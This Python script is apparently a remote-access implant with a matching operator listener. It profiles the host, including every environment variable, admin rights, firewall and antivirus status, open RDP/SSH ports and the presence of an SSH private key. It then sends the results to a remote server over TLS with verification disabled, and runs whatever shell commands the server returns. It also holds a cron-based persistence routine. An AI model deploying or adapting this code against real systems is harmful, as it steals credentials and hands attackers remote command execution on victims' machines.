import os
import platform
import subprocess
import socket
import sys
import io
import contextlib
import json
import time
import ssl


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CYAN = '\033[36m'
    GREEN = '\033[32m'
    RED = '\033[31m'
    YELLOW = '\033[33m'
    WHITE = '\033[37m'
    BLACK = '\033[30m'
    MAGENTA = '\033[35m'
    BLUE = '\033[34m'

def enumerate_system():
    """Capture system information and environment variables in a structured JSON format."""
    try:
        system_info = {
            "OS": f"{platform.system()} {platform.release()}",
            "Architecture": platform.architecture()[0],
            "Hostname": platform.node(),
            "User": os.getlogin(),
            "User ID": os.getuid(),
            "Group ID": os.getgid(),
            "Group IDs": os.getgroups()
        }

        environment_variables = dict(os.environ)

        result = {
            "System Information": system_info,
            "Environment Variables": environment_variables
        }

        # Print the structured JSON for debugging
        print(json.dumps(result, indent=4))

        return result
    except Exception as e:
        print(f"Error capturing system information: {e}")
        return {"error": str(e)}
    
    
def list_cool_directories():
    print("=== Cool Directories ===" )
    cool_linux_dirs = [
        "/etc",
        "/var/log",
        "/home",
        "/usr/local/bin",
        "/usr/local/sbin",
        "/usr/bin",
        "/usr/sbin",
        "/opt"
    ]
    cool_linux_dirs += ["/root"] if os.geteuid() == 0 else []
    
    
    cool_windows_dirs = [
        "C:\\Program Files",
        "C:\\Program Files (x86)",
        "C:\\Windows",
        "C:\\Users"
    ]
    cool_dirs = cool_linux_dirs if platform.system() == "Linux" else cool_windows_dirs
    
    
    cool_mac_dirs = [
        "/Applications",
        "/Library",
        "/System",
        "/Users",
        "/opt"
    ]
    cool_dirs = cool_mac_dirs if platform.system() == "Darwin" else cool_dirs
    
    for directory in cool_dirs:
        if os.path.exists(directory):
            print(f"{directory} exists.")
        else:
            print(f"{directory} does not exist.")
    print()

    

def check_if_vm():
    try:
        product_name_path = "/sys/class/dmi/id/product_name"
        if os.path.exists(product_name_path):
            with open(product_name_path, "r") as f:
                product_name = f.read().strip()
                if "Virtual" in product_name or "VMware" in product_name or "KVM" in product_name:
                    print("This is a virtual machine.")
                else:
                    print("This is not a virtual machine.")
        else:
            print("VM check file does not exist. Unable to determine if this is a virtual machine.")
    except Exception as e:
        print(f"Error checking VM: {e}")
    print()
    

def check_if_container():
    try:
        cgroup_path = "/proc/1/cgroup"
        if os.path.exists(cgroup_path):
            with open(cgroup_path, "r") as f:
                cgroup = f.read()
                if "docker" in cgroup or "lxc" in cgroup:
                    print("This is a container.")
                else:
                    print("This is not a container.")

        else:
            print("Container check file does not exist. Unable to determine if this is a container.")
    except Exception as e:
        print(f"Error checking container: {e}")
    print()
    


def check_if_root():
    try:
        if os.geteuid() == 0:
            print("Running as root.")
        else:
            print("Not running as root.")
    except Exception as e:
        print(f"Error checking root: {e}")
    print()
    

# check if the user is admin
def check_if_admin():
    try:
        if platform.system() == "Windows":
            admin_check = subprocess.check_output(["net", "localgroup", "Administrators"], text=True)
            if os.geteuid() == 0 or "Administrators" in admin_check:
                print("User is an administrator.")
            else:
                print("User is not an administrator.")
        else:
            if os.geteuid() == 0:
                print("User is an administrator.")
            else:
                print("User is not an administrator.")
    except subprocess.CalledProcessError as e:
        print(f"Error checking admin privileges: {e}")
    except Exception as e:
        print(f"Error checking admin privileges: {e}")
    print()
    
    
def check_if_firewall():
    try:
        if platform.system() == "Windows":
            firewall_check = subprocess.check_output(["netsh", "advfirewall", "show", "allprofiles"], text=True)
            if "State ON" in firewall_check:
                print("Firewall is enabled.")
            else:
                print("Firewall is disabled.")
        if platform.system() == "Linux":
            firewall_check = subprocess.check_output(["iptables", "-L"], text=True)
            if "Chain INPUT" in firewall_check:
                print("Firewall is enabled.")
            else:
                print("Firewall is disabled.")
        if platform.system() == "Darwin":
            firewall_check = subprocess.check_output(["/usr/libexec/ApplicationFirewall/socketfilterfw", "--getglobalstate"], text=True)
            if "Firewall is enabled" in firewall_check:
                print("Firewall is enabled.")
            else:
                print("Firewall is disabled.")
    except subprocess.CalledProcessError as e:
        print(f"Error checking firewall status: {e}")
    except Exception as e:
        print(f"Error checking firewall status: {e}")
    print()
    
    

def check_if_antivirus():
    try:
        if (platform.system() == "Linux"):
            if os.path.exists("/usr/bin/dpkg"):
                antivirus_check = subprocess.check_output(["dpkg", "-l"], text=True)
                if "clamav" in antivirus_check:
                    print("ClamAV is installed.")
                else:
                    print("ClamAV is not installed.")
            else:
                print("dpkg is not available on this system. Unable to check for antivirus.")
        else:
            print("Antivirus check is not supported on this platform.")
    except subprocess.CalledProcessError as e:
        print(f"Error checking antivirus status: {e}")
    except Exception as e:
        print(f"Error checking antivirus status: {e}")
    print()
    
    
# check if RDP is listening on port 3389
def check_if_rdp():
    try:
        if platform.system() == "Windows":
            rdp_check = subprocess.check_output(["netstat", "-an"], text=True)
            if any(":3389" in line and "LISTENING" in line for line in rdp_check.splitlines()):
                print("RDP is enabled and the port is open.")
            else:
                print("RDP is disabled or the port is not open.")
                
                
        elif platform.system() == "Darwin":
            result = subprocess.run(["lsof", "-i", ":3389"], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0 and result.stdout.strip():
                print("RDP is enabled and the port is open.")
            else:
                print("RDP is disabled or the port is not open.")
                
                
        elif platform.system() == "Linux":
            result = subprocess.run(["ss", "-tuln"], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0 and "3389" in result.stdout:
                print("RDP is enabled and the port is open.")
            else:
                print("RDP is disabled or the port is not open.")
    except Exception as e:
        print(f"Error checking RDP status: {e}")
    print()
    

# check if SSH is listening on port 22
def check_if_ssh():
    try:
        if platform.system() == "Windows":
            ssh_check = subprocess.check_output(["netstat", "-an"], text=True)
            if any(":22" in line and "LISTENING" in line for line in ssh_check.splitlines()):
                print("SSH is enabled and the port is open.")
            else:
                print("SSH is disabled or the port is not open.")
                
                
        elif platform.system() == "Darwin":
            result = subprocess.run(["lsof", "-i", ":22"], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0 and result.stdout.strip():
                print("SSH is enabled and the port is open.")
            else:
                print("SSH is disabled or the port is not open.")
                
                
        elif platform.system() == "Linux":
            result = subprocess.run(["ss", "-tuln"], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0 and ":22" in result.stdout:
                print("SSH is enabled and the port is open.")
            else:
                print("SSH is disabled or the port is not open.")
                
    except Exception as e:
        print(f"Error checking SSH status: {e}")
    print()
    
    

def gen_uuid():
    try:
        uuid = subprocess.check_output(["uuidgen"], text=True).strip()
        print(f"Generated UUID: {uuid}")
    except subprocess.CalledProcessError as e:
        print(f"Error generating UUID: {e}")
    except Exception as e:
        print(f"Error generating UUID: {e}")
    print()
    
    

def check_if_ssh_key():
    try:
        ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
        if os.path.exists(ssh_key_path):
            print("SSH key exists.")
        else:
            print("SSH key does not exist.")
    except Exception as e:
        print(f"Error checking SSH key: {e}")
    print()
    
    
def check_python_version():
    try:
        python_version = platform.python_version()
        print(f"Python version: {python_version}")
    except Exception as e:
        print(f"Error checking Python version: {e}")
    print() 

def connect_to_server(server_ip, server_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            print(f"Connecté à {server_ip}:{server_port}")
            while True:
                message = input("Entrez un message (ou 'exit' pour quitter) : ")
                if message.lower() == 'exit':
                    break
                s.sendall(message.encode('utf-8'))
                data = s.recv(1024)
                print(f"Reçu : {data.decode('utf-8')}")
    except Exception as e:
        print(f"Erreur : {e}")
        

def listen_to_netcat(port):
    """Listen for encrypted data over TLS, decrypt it, and handle bidirectional communication."""
    try:
        # Create a socket and wrap it with SSL
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile="server.crt", keyfile="server.key")

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', port))
            s.listen(1)
            print(f"Listening for TLS connections on port {port}...")

            with context.wrap_socket(s, server_side=True) as tls_socket:
                conn, addr = tls_socket.accept()
                with conn:
                    print(f"TLS connection established with {addr}")
                    buffer = b""

                    # Receive initial data from the client
                    while True:
                        data = conn.recv(1024)
                        if data:
                            buffer += data
                            if b"<END>" in buffer:
                                message = buffer.decode('utf-8').replace("<END>", "")
                                try:
                                    json_data = json.loads(message)
                                    print("Parsed JSON data:")
                                    print(json.dumps(json_data, indent=4))  # Pretty-print the JSON
                                except json.JSONDecodeError:
                                    print(f"Received non-JSON message: {message}")
                                buffer = b""  # Clear the buffer for the next message
                                break

                    # Enter bidirectional communication loop
                    while True:
                        command = input("Enter a command to send to the client (or 'exit' to close): ")
                        if command.lower() == 'exit':
                            print("Closing the connection.")
                            conn.sendall(b"exit<END>")
                            break
                        conn.sendall((command + "<END>").encode('utf-8'))

                        # Receive the response from the client
                        response = b""
                        while True:
                            data = conn.recv(1024)
                            if data:
                                response += data
                                if b"<END>" in response:
                                    print("Client response:")
                                    print(response.decode('utf-8').replace("<END>", ""))
                                    break
                            else:
                                print("No more data received. Closing connection.")
                                break
    except Exception as e:
        print(f"Error: {e}")
        
def capture_function_output(func, *args, **kwargs):
    """Capture the output of a function."""
    output = io.StringIO()
    with contextlib.redirect_stdout(output):
        func(*args, **kwargs)
    return output.getvalue()



def send_all_outputs_to_server(server_ip, server_port):
    """Capture all function outputs and send them to the server over SSL, then handle bidirectional communication."""
    try:
        # Create an SSL context
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False  # Disable hostname verification
        context.verify_mode = ssl.CERT_NONE  # Disable certificate verification

        with socket.create_connection((server_ip, server_port)) as sock:
            with context.wrap_socket(sock, server_hostname=server_ip) as ssl_sock:
                print(f"Connected to {server_ip}:{server_port} over SSL")

                # List of functions to execute and send their outputs
                functions = [
                    enumerate_system,
                    list_cool_directories,
                    check_if_vm,
                    check_if_container,
                    check_if_root,
                    check_if_admin,
                    check_if_firewall,
                    check_if_antivirus,
                    check_if_rdp,
                    check_if_ssh,
                    check_if_ssh_key,
                    gen_uuid,
                    check_python_version
                ]

                # Send each function's output as a separate JSON message
                outputs = {}
                for func in functions:
                    try:
                        output = capture_function_output(func)
                        outputs[func.__name__] = output
                    except Exception as e:
                        outputs[func.__name__] = f"Error: {e}"

                json_data = json.dumps(outputs, indent=4)
                ssl_sock.sendall((json_data + "<END>").encode('utf-8'))
                print("Sent all outputs to the server.")

                # enter bidirectional communication loop
                while True:
                    # Receive command from the server
                    command = b""
                    while True:
                        data = ssl_sock.recv(1024)
                        if data:
                            command += data
                            if b"<END>" in command:
                                command = command.decode('utf-8').replace("<END>", "")
                                break

                    if command.lower() == 'exit':
                        print("Server closed the connection.")
                        break

                    print(f"Received command from server: {command}")

                    # execute the command and send the result back to the server
                    try:
                        result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        result = f"Error executing command: {e.output}"

                    ssl_sock.sendall((result + "<END>").encode('utf-8'))

    except Exception as e:
        print(f"Error: {e}")



def gain_persistence():
    if (os.platform == "Linux"):
        try:
            # Create a cron job to run the script at startup
            subprocess.check_output(["bash", "-c", "(crontab -l ; echo '@reboot python3 " + __file__ + "') | crontab -"])
            print("Persistence established on Linux.")
        except subprocess.CalledProcessError as e:
            print(f"Error establishing persistence on Linux: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py -listen <port> | -connect <server_ip> <server_port>")
        sys.exit(1)

    if sys.argv[1] == "-listen":
        port = int(sys.argv[2])
        listen_to_netcat(port)
        
    elif sys.argv[1] == "-connect":
        server_ip = sys.argv[2]
        server_port = int(sys.argv[3])
        send_all_outputs_to_server(server_ip, server_port)
    else: 
        print("Usage: python script.py -listen <port> | -connect <server_ip> <server_port>")
        sys.exit(1)

    
    